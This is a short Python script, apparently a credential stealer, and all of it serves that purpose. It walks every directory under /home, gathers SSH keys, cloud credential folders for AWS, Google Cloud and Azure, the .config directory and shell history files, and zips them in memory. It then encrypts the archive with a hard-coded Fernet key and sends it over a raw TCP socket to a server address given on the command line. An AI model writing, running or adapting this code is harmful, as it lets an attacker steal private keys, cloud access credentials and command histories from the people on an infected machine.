import os, socket, argparse, re, zipfile, io
from cryptography.fernet import Fernet

# Use argparse to appropriately and smoothly validate arguments
parser = argparse.ArgumentParser(allow_abbrev=False)

# Argparse method that ensures port is within valid range
def port(target):
	# Raises an error if single port is not an integer or valid port
	port = int(target)
	if port < 0 or port > 65535:
		raise ValueError
	return port

# Argparse method that ensures IPv4 target address argument is correctly formatted
def ip_address(target):
	byte1, byte2, byte3, byte4 = target.split(".")
	
	# Raise an error for non-integer arguments
	byte1 = int(byte1)
	byte2 = int(byte2)
	byte3 = int(byte3)
	byte4 = int(byte4)
	
	# Ensure values fall within valid byte range
	if (byte1 < 0 or byte1 > 255) or (byte2 < 0 or byte2 > 255) or (byte3 < 0 or byte3 > 255) or (byte4 < 0 or byte4 > 255):
		raise ValueError
	return target

# Add arguments to argparse
parser.add_argument('ip', type=ip_address, nargs=1, help='Specifies server IP address')
parser.add_argument('port', type=port, nargs=1, help='Specfies server port')

args=parser.parse_args()

desired_extensions = [
    r".*/\.ssh/?",
    r".*/\.config/?",
    r".*/\.aws/?",
    r".*/\.gcloud/?",
    r".*/\.azure/?",
    r".*/.*_history"
]



def get_files():
	paths_to_copy = []
	files_to_zip = []
	
	for curr_dir, subdirs, files in os.walk("/home", followlinks=False):
		for pattern in desired_extensions:
			if re.fullmatch(pattern, curr_dir):
				paths_to_copy.append(curr_dir)
				break
		copy_dir = False
		for path in paths_to_copy:
			if curr_dir.startswith(path):
				copy_dir = True
		for fname in files:
			file_path = os.path.join(curr_dir, fname)
			if copy_dir:
				files_to_zip.append(file_path)
				continue
			for pattern in desired_extensions:
				if re.fullmatch(pattern, file_path):
					files_to_zip.append(file_path)
					break
	return files_to_zip
	
def zip_files(file_paths):
	buffer = io.BytesIO()
	with zipfile.ZipFile(buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
		for file_path in file_paths:
			archive_path = os.path.relpath(file_path, "/home")
			zf.write(file_path, archive_path)
	return buffer

def send_data(server_ip, server_port, encoded_msg):
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.connect((server_ip, server_port))
	sock.sendall(encoded_msg)

files_to_zip = get_files()
zf_bytes = zip_files(files_to_zip)

key = b'rfxRvXZ1FTB8XdCew9-BwGnb65iCiXGGo6TzH67KfZg='
fernet = Fernet(key)

encrypted_zf = fernet.encrypt(zf_bytes.getvalue())

send_data(args.ip[0], args.port[0], encrypted_zf)
